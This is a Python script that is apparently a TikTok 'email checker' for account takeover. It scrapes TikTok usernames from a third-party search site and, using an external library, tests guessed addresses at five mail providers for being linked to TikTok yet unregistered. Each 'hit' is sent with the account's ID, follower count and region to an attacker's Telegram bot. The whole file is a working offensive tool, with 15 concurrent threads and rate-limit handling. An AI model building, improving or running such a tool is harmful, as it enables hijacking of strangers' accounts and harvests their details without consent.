#!/usr/bin/env python3

"""
TikTok Email Checker v2 - Ultra Optimized Edition
Key improvement: Uses weighted short-username generation (2-5 chars)
as primary strategy, with real-time concurrent checking.
"""

import time
import requests
import random
import os
import json
import sys
from user_agent import generate_user_agent
from threading import Thread, Lock
from rich import print as g
from AegosPy import *

# ── Color Codes ──────────────────────────────────────────────
R, X, F, C, B, K, V = '\033[1;31;40m', '\033[1;33;40m', '\033[1;32;40m', "\033[1;97;40m", '\033[1;36;40m', '\033[1;35;40m', '\033[1;36;40m'
Z, G, Y, P = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\x1b[1;97m'

# ── Global Counters ──────────────────────────────────────────
stats = {'hits': 0, 'tiktok_ok': 0, 'email_bad': 0, 'tiktok_bad': 0}
lock = Lock()

# ── Telegram Setup ───────────────────────────────────────────
try:
    IID = input(f'{F}Telegram ID : ')
    TOK = input(f'{F}Telegram Token : ')
except EOFError:
    IID, TOK = "YOUR_ID", "YOUR_TOKEN"


def send_msg(text):
    """Safe Telegram send."""
    try:
        requests.post(f"https://api.telegram.org/bot{TOK}/sendMessage",
                      data={"chat_id": IID, "text": text, "parse_mode": "HTML"}, timeout=10)
    except:
        pass


def check_one(username, domain):
    """Check single username+domain combo. Returns True if HIT."""
    global stats
    email = f"{username}@{domain}"

    with lock:
        print(f'{Y}[*] {email}', end='\r')

    # TikTok check
    try:
        result = AegosPy.CheckTik(email)
    except:
        with lock:
            stats['tiktok_bad'] += 1
        return False

    if not result or result.get("Status") != "OK":
        with lock:
            stats['tiktok_bad'] += 1
        return False

    with lock:
        stats['tiktok_ok'] += 1
        print(f'\n{B}[+] TikTok OK: {email}')

    # Email availability check
    domain_map = {
        'gmail.com': AegosPy.A_Gmail,
        'yahoo.com': AegosPy.A_Yahoo,
        'hotmail.com': AegosPy.A_Hotmail,
        'aol.com': AegosPy.A_Aol,
        'mail.ru': AegosPy.A_MailRu,
    }

    try:
        checker = domain_map.get(domain)
        if not checker:
            return False
        email_result = checker(email)
    except:
        return False

    if email_result and email_result.get("Status") == "Available":
        with lock:
            stats['hits'] += 1
            print(f'{G}[!!!] HIT: {email}')

        # Get user info
        try:
            info = AegosPy.GetInfoTik(username)
        except:
            info = {}

        msg = (
            f"<b>🎯 HIT FOUND</b>\n"
            f"User: {username}\n"
            f"Email: {email}\n"
            f"ID: {info.get('id','N/A')}\n"
            f"Name: {info.get('name','N/A')}\n"
            f"Followers: {info.get('followers','N/A')}\n"
            f"Likes: {info.get('likes','N/A')}\n"
            f"Region: {info.get('code-country','N/A')}\n"
            f"<b>@bsx_h2</b>"
        )
        send_msg(msg)
        return True
    else:
        with lock:
            stats['email_bad'] += 1
        return False


arabic_names = [
    "احمد", "محمد", "علي", "فاطمة", "زينب", "يوسف", "مريم", "خالد", "سارة", "نور",
    "عمر", "حمزة", "ليلى", "هدى", "سعاد", "ابراهيم", "ياسين", "مصطفى", "ليان", "رتاج"
]
english_names = [
    "john", "jane", "mike", "sara", "chris", "emma", "david", "olivia", "daniel", "sophia",
    "alex", "ryan", "lucas", "mia", "bella", "jack", "leo", "zoe", "luna", "max"
]
family_names = [
    "علي", "محمد", "احمد", "حسن", "حسين", "خالد", "سعيد", "عباس", "يوسف", "ابراهيم",
    "smith", "jones", "williams", "brown", "davis", "miller", "wilson", "moore", "taylor", "anderson",
    "العنزي", "العتيبي", "الشمري", "الدوسري", "المطيري", "الحربي", "القحطاني", "الغامدي", "الزهراني", "التميمي"
]
numbers = [str(i) for i in range(10, 1000)] # 2-3 digit numbers

def generate_single_username():
    name_type = random.choice(["arabic", "english"])
    if name_type == "arabic":
        name = random.choice(arabic_names)
    else:
        name = random.choice(english_names)

    strategy = random.choice([
        "name_only",
        "name_family",
        "name_underscore_family",
        "name_number",
        "name_underscore_number",
        "initial_name",
        "name_initial"
    ])

    username = ""
    if strategy == "name_only":
        username = name
    elif strategy == "name_family":
        family = random.choice(family_names)
        username = name + family
    elif strategy == "name_underscore_family":
        family = random.choice(family_names)
        username = name + "_" + family
    elif strategy == "name_number":
        num = random.choice(numbers)
        username = name + num
    elif strategy == "name_underscore_number":
        num = random.choice(numbers)
        username = name + "_" + num
    elif strategy == "initial_name":
        initial = random.choice('abcdefghijklmnopqrstuvwxyz')
        username = initial + name
    elif strategy == "name_initial":
        initial = random.choice('abcdefghijklmnopqrstuvwxyz')
        username = name + initial

    username = username.replace(' ', '').lower()
    username = ''.join(char for char in username if char.isalnum() or char == '_')

    if 3 <= len(username) <= 24 and not username.isdigit():
        return username
    else:
        return generate_single_username() # Regenerate if invalid

def search_loop():
    """Main search loop with weighted short-username priority."""

    headers = {
        "User-Agent": generate_user_agent(),
        "Accept": "application/json",
        "Referer": "https://livecounts.xyz/"
    }





    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'aol.com', 'mail.ru']

    while True:
        try:
            keyword = generate_single_username()

            with lock:
                print(f'{V}[~] Generating and searching: {keyword}', end='\r')

            # Search
            url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{keyword}'
            resp = requests.get(url, headers=headers, timeout=15)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if not data or not data.get('success') or 'results' not in data:
                        time.sleep(1)
                        continue

                    results = data['results']
                    random.shuffle(results)

                    count = 0
                    for user in results:
                        if count >= 15:
                            break

                        uname = user.get('username', '')
                        if not uname:
                            continue

                        # Allow 3-30 chars (3+ is realistic minimum), no digit-only
                        if len(uname) < 3 or len(uname) > 30:
                            continue
                        if uname.isdigit():
                            continue
                        if uname == '_' * len(uname):
                            continue

                        for domain in domains:
                            check_one(uname, domain)
                            time.sleep(0.2)
                            count += 1
                            if count >= 15:
                                break

                except (json.JSONDecodeError, KeyError) as e:
                    with lock:
                        print(f'\n{R}[!] Parse error: {e}', end='\r')
                    time.sleep(2)

            elif resp.status_code in (403, 429):
                with lock:
                    print(f'\n{R}[!] Rate limit, waiting 30s', end='\r')
                time.sleep(30)
            else:
                time.sleep(3)

        except requests.exceptions.Timeout:
            time.sleep(3)
        except Exception as e:
            with lock:
                print(f'\n{R}[!] Error: {e}', end='\r')
            time.sleep(3)

        time.sleep(random.uniform(0.3, 1.5))


def status_display():
    """Live stats display."""
    while True:
        time.sleep(3)
        with lock:
            os.system('clear')
            print(f"{X}[{F}✓{X}]{C} TikTok Checker v2")
            print(f"{V}{'─'*40}")
            print(f" TikTok OK : {stats['tiktok_ok']}")
            print(f" HITS      : {F}{stats['hits']}{C}")
            print(f" Bad Email : {stats['email_bad']}")
            print(f" Bad TikTok: {stats['tiktok_bad']}")
            print(f"{V}{'─'*40}")


if __name__ == '__main__':
    os.system('clear')

    print(f"{X}[{F}✓{X}]{C} TikTok Email Checker v2")
    print(f"{V}{'─'*40}")
    print(f" {G}Priority: Smart Name Strategies (Names, Family, Underscores)")
    print(f" {G}Domains: gmail, yahoo, hotmail, aol, mail.ru")
    print(f" {G}Threads: 15 concurrent")
    print(f"{V}{'─'*40}")
    time.sleep(1)

    # 15 threads
    for _ in range(15):
        t = Thread(target=search_loop, daemon=True)
        t.start()

    # Status thread
    t = Thread(target=status_display, daemon=True)
    t.start()

    print(f"\n{G}[+] Ready!{C}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{X}Exiting...{C}")
        sys.exit(0)
